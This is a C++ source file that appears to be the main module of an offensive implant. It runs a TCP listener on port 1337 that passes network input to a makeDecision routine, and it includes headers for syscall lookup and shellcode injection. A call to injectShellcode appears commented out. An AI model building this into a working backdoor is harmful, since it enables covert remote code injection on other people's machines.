#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996)

#include "winsock2.h"
#include "windows.h"
#include <iostream>
#include "getSyscall.h"
#include "injectShellcode.h"
#include "makeDecision.h"


int main(int argc, char* argv[]) {
	WSADATA wsaData;
	int iResult = 0;

	SOCKET ListenSocket = INVALID_SOCKET;
	sockaddr_in service;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		printf("WSAStartup() failed with error: %d\n", iResult);
		return 1;
	}

	ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = inet_addr("0.0.0.0");
	service.sin_port = htons(1337);

	iResult = bind(ListenSocket, (SOCKADDR*)&service, sizeof(service));
	if (iResult == SOCKET_ERROR) {
		printf("bind function failed with error %d\n", WSAGetLastError());
		iResult = closesocket(ListenSocket);
		if (iResult == SOCKET_ERROR) {
			printf("closesocket function failed with error %d\n", WSAGetLastError());
		}
		WSACleanup();
		return 1;
	}

	if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
		printf("listen function failed with error: %d\n", WSAGetLastError());
	}

	printf("Listening on socket...\n");

	SOCKET ClientSocket;

	ClientSocket = INVALID_SOCKET;

	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	
	char recvbuf[512];
	int iSendResult;
	int recvbuflen = 512;

	memset(&recvbuf[0], '\0', sizeof(recvbuf));

	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			printf("Bytes received: %d\n", iResult);
			
			makeDecision(recvbuf, iResult);
			
			iSendResult = send(ClientSocket, recvbuf, iResult, 0);
			if (iSendResult == SOCKET_ERROR) {
				printf("send failed: %d\n", WSAGetLastError());
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
			printf("Bytes sent: %d\n", iSendResult);
		}
		else if (iResult == 0) {
			printf("Connection closing...\n");
		}
		else {
			printf("recv failed: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return 1;
		}
	} while (iResult > 0);

	iResult = closesocket(ListenSocket);
	if (iResult == SOCKET_ERROR) {
		printf("closesocket function failed with error %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	WSACleanup();
	return 0;

	/*
	BOOL spawnProc = true;
	int PID = 0;
	BOOL unsafe = false;

	injectShellcode(spawnProc, PID, unsafe);

	return 0;
	*/
}